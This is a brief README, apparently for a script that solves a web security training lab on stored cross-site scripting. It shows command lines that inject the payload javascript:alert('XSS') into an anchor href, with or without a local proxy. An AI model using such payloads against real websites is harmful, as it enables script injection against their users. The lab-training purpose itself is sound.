# How to run script.py

### Stored XSS into anchor href attribute with double quotes HTML-encoded

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "javascript:alert('XSS')"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "javascript:alert('XSS')" -p 127.0.0.1:8080`
